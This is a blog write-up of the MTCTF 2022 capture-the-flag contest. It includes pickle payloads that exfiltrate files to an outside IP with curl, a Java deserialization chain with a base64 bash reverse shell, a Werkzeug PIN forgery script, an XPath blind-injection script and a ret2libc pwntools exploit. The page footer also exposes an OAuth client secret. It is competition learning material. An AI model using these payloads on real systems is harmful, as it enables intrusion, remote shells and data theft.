@@ -1,0 +1,805 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>MTCTF Writeup By Light1ng | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="MTCTF Writeup By Light1ng | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Web
+easypickle
+下载附件，是一个flask框架，然后很明显的存在pickle反序列化，首先我们需要伪造session成为admin。
+import base64
+import pickle
+from flask import ..." />
+    <meta name="keywords" content="Java,反序列化,Shiro,Pickle,Flask" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              MTCTF Writeup By Light1ng
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-09-17
+              </span>
+              <span>
+                16 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+                <a href="https://le1a.github.io/tag/u4AbpM3qf1/" class="post-tag">
+                  # Shiro
+                </a>
+              
+                <a href="https://le1a.github.io/tag/SZkEVhE-wX/" class="post-tag">
+                  # Pickle
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Ho5lh2d0I_/" class="post-tag">
+                  # Flask
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="web">Web</h1>
+<h2 id="easypickle">easypickle</h2>
+<p>下载附件，是一个flask框架，然后很明显的存在pickle反序列化，首先我们需要伪造session成为admin。</p>
+<pre><code class="language-python">import base64
+import pickle
+from flask import Flask, session
+import os
+import random
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(2).hex()
+print(app.config['SECRET_KEY'])
+@app.route('/')
+def hello_world():
+    if not session.get('user'):
+        session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5))
+    return 'Hello {}!'.format(session['user'])
+
+
+@app.route('/admin')
+def admin():
+    if session.get('user') != &quot;admin&quot;:
+        return f&quot;&lt;script&gt;alert('Access Denied');window.location.href='/'&lt;/script&gt;&quot;
+    else:
+        try:
+            a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)
+            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
+                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)
+            pickle.loads(base64.b64decode(session.get('ser_data')))
+            return &quot;ok&quot;
+        except:
+            return &quot;error!&quot;
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8888)
+</code></pre>
+<p>这里的key是随机两字节的hex，很短，直接爆破了，这里贴一个网上公开的脚本:</p>
+<pre><code class="language-python">import os
+
+# standard imports
+import sys
+import zlib
+from itsdangerous import base64_decode
+import ast
+
+# Abstract Base Classes (PEP 3119)
+if sys.version_info[0] &lt; 3:  # &lt; 3.0
+    raise Exception('Must be using at least Python 3')
+elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4:  # &gt;= 3.0 &amp;&amp; &lt; 3.4
+    from abc import ABCMeta, abstractmethod
+else:  # &gt; 3.4
+    from abc import ABC, abstractmethod
+
+# Lib for argument parsing
+import argparse
+
+# external Imports
+from flask.sessions import SecureCookieSessionInterface
+
+
+class MockApp(object):
+
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+
+
+class FSCM(ABC):
+    def encode(secret_key, session_cookie_structure):
+        &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;
+        try:
+            app = MockApp(secret_key)
+
+            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
+            si = SecureCookieSessionInterface()
+            s = si.get_signing_serializer(app)
+
+            return s.dumps(session_cookie_structure)
+        except Exception as e:
+            return &quot;[Encoding error] {}&quot;.format(e)
+            raise e
+
+    def decode(session_cookie_value, secret_key=None):
+        &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;
+        try:
+            if (secret_key == None):
+                compressed = False
+                payload = session_cookie_value
+
+                if payload.startswith('.'):
+                    compressed = True
+                    payload = payload[1:]
+
+                data = payload.split(&quot;.&quot;)[0]
+
+                data = base64_decode(data)
+                if compressed:
+                    data = zlib.decompress(data)
+
+                return data
+            else:
+                app = MockApp(secret_key)
+
+                si = SecureCookieSessionInterface()
+                s = si.get_signing_serializer(app)
+
+                return s.loads(session_cookie_value)
+        except Exception as e:
+            return &quot;[Decoding error] {}&quot;.format(e)
+            raise e
+
+
+dic = '0123456789abcdef'
+if __name__ == '__main__':
+    for i in dic:
+        for j in dic:
+            for k in dic:
+                for l in dic:
+                    key = i + j + k + l
+                    res = FSCM.decode('eyJ1c2VyIjoiZG1ubm4ifQ.YyVnKg.gh-CqX6tnM1otj37Zgs91tggvEU', key)
+                    # print(res)
+                    if 'user' in str(res):
+                        print(key)
+                        exit()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/b3b0c6c4606e5.png" alt="image-20220917155340052" loading="lazy"></figure>
+<p>爆破得到key为6284，现在就可以通过<code>flask_session_cookie_manager</code>来伪造session。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/e7a1472b08ec6.png" alt="image-20220917155748993" loading="lazy"></figure>
+<p>目前就成功伪造了session。接下来看看后面的反序列化逻辑。</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/d837d2e7d6b6b.png" alt="image-20220917155821455" loading="lazy"></figure>
+<p>从session中获取<code>ser_data</code>键的值，然后替换掉一些字符，然后过滤<code>R i o b</code>,就没法用<code>pker</code>来生成payload了，这里直接手搓opcode了，</p>
+<pre><code class="language-python">b'''(cos\nsystem\nS'calc'\nos.'''
+</code></pre>
+<p>然后现在只需要把这个base64编码一下，然后作为<code>ser_data</code>的值，写入session即可。因为没有回显，尝试了反弹shell无果后，选择了curl外带数据，然后直接外带的话，因为换行的原因，只显示第一行，所以说选择把命令执行结果写入文件，然后把文件的内容外带出来</p>
+<pre><code class="language-python">b'''(cos\nsystem\nS'ls&gt;/3.txt'\nos.''' #把ls的结果写入根目录的3.txt
+b'''(cos\nsystem\nS'curl -T /3.txt http://101.43.66.67:12345'\nos.'''  #外带/3.txt的内容到服务器上
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/99ab6da3d2ebd.png" alt="image-20220917160536235" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/a65fe6d207c47.png" alt="image-20220917160613341" loading="lazy"></figure>
+<p>发现flag就在当前目录，所以直接外带flag数据就行了。</p>
+<p>payload:</p>
+<pre><code class="language-python">a2 = b'''(cos\nsystem\nS'curl -T flag http://101.43.66.67:12345'\nos.'''
+print(base64.b64encode(a2)) #KGNvcwpzeXN0ZW0KUydjdXJsIC1UIGZsYWcgaHR0cDovLzEwMS40My42Ni42NzoxMjM0NScKb3Mu
+</code></pre>
+<p>然后伪造session</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/f1995d9534dc1.png" alt="image-20220917160836032" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/58c18be6ea8b2.png" alt="image-20220917161459387" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/4b939e33e5d53.png" alt="" loading="lazy"></figure>
+<pre><code class="language-flag">flag{d58017f8-7e52-42e1-9306-dc3310813531}
+</code></pre>
+<h2 id="onlineunzip">OnlineUnzip</h2>
+<p>在打开源码阅读之后发现考点为pin码伪造但需要去上传含有软链接的文件，在搜索文章后发现做法</p>
+<p>https://xz.aliyun.com/t/11647?page=1</p>
+<p>https://xz.aliyun.com/t/8092#toc-3</p>
+<p>https://xz.aliyun.com/t/2589</p>
+<p>利用脚本为</p>
+<pre><code class="language-python">import hashlib
+from itertools import chain
+import argparse
+
+
+
+def getMd5Pin(probably_public_bits, private_bits):
+    h = hashlib.md5()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode('utf-8')
+        h.update(bit)
+    h.update(b'cookiesalt')
+
+    num = None
+    if num is None:
+        h.update(b'pinsalt')
+        num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+    rv = None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                              for x in range(0, len(num), group_size))
+                break
+        else:
+            rv = num
+
+    return rv
+
+def getSha1Pin(probably_public_bits, private_bits):
+    h = hashlib.sha1()
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode(&quot;utf-8&quot;)
+        h.update(bit)
+    h.update(b&quot;cookiesalt&quot;)
+
+    num = None
+    if num is None:
+        h.update(b&quot;pinsalt&quot;)
+        num = f&quot;{int(h.hexdigest(), 16):09d}&quot;[:9]
+
+    rv = None
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = &quot;-&quot;.join(
+                    num[x: x + group_size].rjust(group_size, &quot;0&quot;)
+                    for x in range(0, len(num), group_size)
+                )
+                break
+        else:
+            rv = num
+
+    return rv
+
+def macToInt(mac):
+    mac = mac.replace(&quot;:&quot;, &quot;&quot;)
+    return str(int(mac, 16))
+
+if __name__ == '__main__':
+    parse = argparse.ArgumentParser(description = &quot;Calculate Python Flask Pin&quot;)
+    parse.add_argument('-u', '--username',required = True, type = str, help = &quot;运行flask用户的用户名&quot;)
+    parse.add_argument('-m', '--modname', type = str, default = &quot;flask.app&quot;, help = &quot;默认为flask.app&quot;)
+    parse.add_argument('-a', '--appname', type = str, default = &quot;Flask&quot;, help = &quot;默认为Flask&quot;)
+    parse.add_argument('-p', '--path', required = True, type = str, help = &quot;getattr(mod, '__file__', None):flask包中app.py的路径&quot;)
+    parse.add_argument('-M', '--MAC', required = True, type = str, help = &quot;MAC地址&quot;)
+    parse.add_argument('-i', '--machineId', type = str, default = &quot;&quot;, help = &quot;机器ID&quot;)
+    args = parse.parse_args()
+
+    probably_public_bits = [
+        args.username,
+        args.modname,
+        args.appname,
+        args.path
+    ]
+
+    private_bits = [
+        macToInt(args.MAC),
+        bytes(args.machineId, encoding = 'utf-8')
+    ]
+    md5Pin = getMd5Pin(probably_public_bits, private_bits)
+    sha1Pin = getSha1Pin(probably_public_bits, private_bits)
+
+    print(&quot;Md5Pin:  &quot; + md5Pin)
+    print(&quot;Sha1Pin:  &quot; + sha1Pin)
+</code></pre>
+<p>已知pin码由<code>username,modname,getattr(app, &quot;__name__&quot;, app.__class__.__name__),getattr(mod, &quot;__file__&quot;, None),str(uuid.getnode()), get_machine_id()</code>这六个参数构成</p>
+<p>读取网卡/sys/class/net/eth0/address</p>
+<p>machine-id构造先读取<code>/proc/self/cgroup</code>，取第一行，利用正则<code>value.strip().partition(&quot;/docker/&quot;)[2]</code>分割拿到数据，结果为空，继续走，取<code>/etc/machine-id</code>，文件不存在，则去读<code>/proc/sys/kernel/random/boot_id</code></p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/0dbbd22faa4a6.png" alt="image-20220917212224081.png" loading="lazy"></figure>
+<pre><code> /proc/self/cgroup 11:name=systemd:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+10:devices:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+9:blkio:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+8:net_cls,net_prio:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+7:perf_event:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+6:cpuset:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+5:memory:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+4:cpu,cpuacct:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+3:hugetlb:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+2:freezer:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+1:pids:/kubepods/podeci-2zegwb2qirhajqqy0l20/bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+0::/
+</code></pre>
+<pre><code>/etc/machine-id
+96cec10d3d9307792745ec3b85c89620
+
+加上前面的bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+所以机器码为: 96cec10d3d9307792745ec3b85c89620bc85db0c4c55f3bbdceccee42016a58f71449fe40d0439ba73387eff00987a87
+</code></pre>
+<p>获得app.py的路径，可以通过制造报错得到。制作一个/路径的软链接即可目录穿越查看到python路径并查看到了flag文件，点击查看即会报错，得到app.py的绝对路径。</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/64b50b60431f5.png" alt="image-20220917213704607.png" loading="lazy"></figure>
+<p>最后通过利用脚本做出pin码登录</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/c2ca43baed026.png" alt="image-20220917211916205.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/9ed1db8797fad.png" alt="image-20220917211706132.png" loading="lazy"></figure>
+<h2 id="babyjava">babyjava</h2>
+<p>考点提示为xpath注入</p>
+<p>在网上搜索了一个脚本和一些文章并对其进行修改</p>
+<p>https://blog.csdn.net/weixin_30185907/article/details/113460995</p>
+<p>https://www.likecs.com/show-203608955.html?sc=3869</p>
+<p>https://www.codenong.com/cs106556717/</p>
+<p>利用盲注脚本对根节点进行猜测</p>
+<p>'or substring(name(/*[1]), {}, 1)</p>
+<p>然后猜测子节点</p>
+<p>'or substring(name(/root/*[1]), {}, 1)</p>
+<p>最后对于user节点的下一节节点猜测</p>
+<p>or substring(name(/root/user/*[position()=2]),{},1)</p>
+<pre><code class="language-python">import time
+import requests
+import string
+import re
+
+
+url = &quot;http://eci-2ze0evt5ezb27535qg8y.cloudeci1.ichunqiu.com:8888/hello&quot;
+headers = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+# 猜测根节点名称
+# payload_1 = &quot;xpath=user1' and substring(name(/*),{},1)='{}' and ''='&quot;
+flag = ''
+strs = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+for i in range(1, 100):
+	for j in strs
+        payload3 = &quot;xpath=user1' and substring(/root/user/*[position()=2], &quot; + str(i) + &quot;, 1)='&quot; + chr(j) + &quot;' and ''='&quot;
+        result = requests.post(url, payload3, headers=headers)
+        if &quot;This information&quot; not in result.text:
+            flag = flag + chr(j)
+            print(flag)
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/461795ce1bf3c.png" alt="image-20220917213530587.png" loading="lazy"></figure>
+<h2 id="easyjava">easyjava</h2>
+<p>打开附件看了一下依赖，有shiro、cb和cc库。</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/9605eac94da9d.png" alt="image-20220917215642881" loading="lazy"></figure>
+<p>打开环境用工具爆破了一下key，没爆破出来。然后看到了/admin/hello 路由，就明白这个题不是直接打shiro的反序列化了。</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/6523e84641e3f.png" alt="image-20220917220007740" loading="lazy"></figure>
+<p>这个路由自定义了一个反序列化，看起来绕过鉴权之后，就能直接打了。后面发现这里还存在有黑名单过滤类。但是有一点问题就是TemplatesImpl类，前面少了个小数点。然后就能直接用CB链打了。</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/126672faffd36.png" alt="image-20220917220215739" loading="lazy"></figure>
+<p>鉴权绕过的话，就直接用CVE-2020-11989</p>
+<pre><code class="language-http">http://47.95.211.153:22983/;/web/admin/hello
+</code></pre>
+<p>然后直接用CB链生成一个反弹shell的恶意字节码的base64编码就行了</p>
+<p><strong>恶意字节码</strong></p>
+<pre><code class="language-java">package ShiroCB;
+
+import java.lang.reflect.Method;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+
+public class Hacker extends AbstractTranslet{
+    public Hacker() throws Exception {
+        Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method exec = runtime.getMethod(&quot;exec&quot;, String.class);
+        Method getruntime = runtime.getMethod(&quot;getRuntime&quot;);
+        Object r = getruntime.invoke(runtime);
+        exec.invoke(r,&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;);
+    }
+
+    public static void main(String[] args) {
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p><strong>CB链</strong></p>
+<pre><code class="language-java">package ShiroCB;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.beanutils.BeanComparator;
+
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.PriorityQueue;
+
+
+public class CB1 {
+    public static void main(String[] args) throws Exception{
+        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\Cc\\IntelliJ IDEA 2021.1\\ShiroAttck\\target\\classes\\ShiroCB\\Hacker.class&quot;));
+        byte[][] codes = {code};//恶意类
+        //CC3
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, &quot;_bytecodes&quot;,codes);
+        setFieldValue(obj, &quot;_name&quot;, &quot;aaaa&quot;);
+        setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        //CB
+        final BeanComparator comparator = new BeanComparator();
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(1);
+        queue.add(1);
+
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{obj, obj});
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+
+        byte[] payload= barr.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(payload));
+
+
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+}
+</code></pre>
+<p>把得到的base64编码，进行url编码一下，然后直接作为data数据发过去</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/dcaab0ebde5cd.png" alt="image-20220917221040534" loading="lazy"></figure>
+<p>收到反弹的shell，find命令查找一下flag位置</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/6c076f6243f94.png" alt="image-20220917221141156" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/09/17/e1e3bde473589.png" alt="image-20220917221220978" loading="lazy"></figure>
+<pre><code class="language-flag">flag{f0391e7d-ec7e-4a8e-8160-ddb1c257e380}
+</code></pre>
+<h1 id="pwn">Pwn</h1>
+<h2 id="note">note</h2>
+<p>checksec发现只开了nx，然后整个程序的逻辑是在栈上管理若干个堆块。</p>
+<p>不难发现，在edit功能的函数内，下标指针v2是int类型的，这里检查越界只检查了是否大于0x10，</p>
+<pre><code class="language-c">int __fastcall sub_4014B6(__int64 a1)
+{
+  int v2; // [rsp+14h] [rbp-Ch]
+  void *buf; // [rsp+18h] [rbp-8h]
+
+  printf(&quot;Index: &quot;);
+  v2 = readint();
+  if ( v2 &gt; 0x10 || !*(_QWORD *)(16LL * v2 + a1) )
+    return puts(&quot;Not allowed&quot;);
+  buf = *(void **)(16LL * v2 + a1);
+  printf(&quot;Content: &quot;);
+  return read(0, buf, *(int *)(16LL * v2 + a1 + 8));
+}
+</code></pre>
+<p>所以是存在问题的。</p>
+<p>经过动态调试，发现v2为-1的时候，恰好可以劫持到<code>sub_4014B6</code>的rbp和ret地址，所以直接在这里ret2libc打两遍，第一遍leak libcbase，第二遍ret到system(&quot;/bin/sh&quot;)即可getshell。</p>
+<p>exp</p>
+<pre><code class="language-python">from pwn import *
+import LibcSearcher
+context.log_level='debug'
+context.arch='amd64'
+# p = process('./note')
+p = remote('39.106.133.19', 44964)
+elf = ELF('./note')
+libc = elf.libc
+
+ru = lambda x : p.recvuntil(x)
+sla = lambda x,y : p.sendlineafter(x,y)
+sa = lambda x,y : p.sendafter(x,y)
+
+def choice(idx):
+	sla('ve\n', str(idx))
+
+def add(size, content=p64(0xdeadbeef)):
+	choice(1)
+	sla('ze: ', str(size))
+	sa('tent: ', content)
+
+def show(idx):
+	choice(2)
+	sla('dex: ', str(idx))
+
+def edit(idx, content):
+	choice(3)
+	sla('dex: ', str(idx))
+	sa('tent: ', content)
+
+def delete(idx):
+	choice(4)
+	sla('dex: ', str(idx))
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+
+# for i in range(16):
+# 	add(0x60)
+add(0x60)
+# pay = asm(shellcraft.sh())
+# g('b *0x401500')
+
+# g('b *0x401579')
+# g('b *0x401500')
+prt_got = elf.got['printf']
+puts_plt = elf.plt['puts']
+pop_rdi = 0x00000000004017b3 # pop rdi ; ret
+ret = 0x000000000040101a # ret
+pay = p64(0)+p64(pop_rdi)+p64(prt_got)+p64(puts_plt)+p64(0x401679)
+edit(-4, pay)
+
+libcbase = u64(p.recv(6).ljust(0x8, b'\x00'))-0x61c90
+print(hex(libcbase))
+
+# g('b *0x401579')
+one = [0xe3afe, 0xe3b01, 0xe3b04]
+sys = libc.symbols['system']
+binsh = next(libc.search(b'/bin/sh\x00'))
+pay = p64(0x404080)+p64(ret)+p64(pop_rdi)+p64(libcbase+binsh)+p64(sys+libcbase)+p64(0x401679)
+# pay = p64(0x404080) + p64(one[1]+libcbase) + p64(0x401679)
+edit(-4, pay)
+# choice(5)
+# pay = p64(0x401150)*2
+# edit(-1, pay)
+# g()
+
+p.interactive()
+</code></pre>
+<h1 id="crypto">Crypto</h1>
+<h2 id="strange_rsa1">strange_rsa1</h2>
+<p>gift是p和q的比值，所以其实是可以直接求出来p和q的，但问题在于python自带函数的精度不够，这里用到了sage来设置好精度计算，</p>
+<pre><code class="language-python"># https://sagecell.sagemath.org/
+n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413
+c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924
+gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938
+pp = numerical_approx((n*gift), prec=1020)
+p = numerical_approx(sqrt(pp), prec=1020)
+print(int(p))
+</code></pre>
+<p>然后在python中求出q和d</p>
+<pre><code class="language-python">from Crypto.Util.number import *
+import gmpy2
+from math import *
+
+
+def qpow(a, b, p):
+    res = 1
+    while(b):
+        if b%2==1:
+            res = (res*a)%p
+        a = (a*a)%p
+        b//=2
+    return res
+
+
+n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413
+c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924
+e = 65537
+p = 10354173078239628635626920146059887542108509101478542108107457141390325356890199583373894457500644181987484104714492532470944829664847264360542662124954077
+q = n//p
+print(int(p))
+print(int(q))
+phin = (p-1)*(q-1)
+d = gmpy2.invert(e, phin)
+print(d)
+m = qpow(c, d, n)
+print(long_to_bytes(m))
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#web">Web</a>
+<ul>
+<li><a href="#easypickle">easypickle</a></li>
+<li><a href="#onlineunzip">OnlineUnzip</a></li>
+<li><a href="#babyjava">babyjava</a></li>
+<li><a href="#easyjava">easyjava</a></li>
+</ul>
+</li>
+<li><a href="#pwn">Pwn</a>
+<ul>
+<li><a href="#note">note</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a>
+<ul>
+<li><a href="#strange_rsa1">strange_rsa1</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/基于Go的RtlCreateUserThread_API注入explorer.exe/">
+              <h3 class="post-title">
+                基于Go的RtlCreateUserThread_API注入explorer.exe(Ⅲ)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
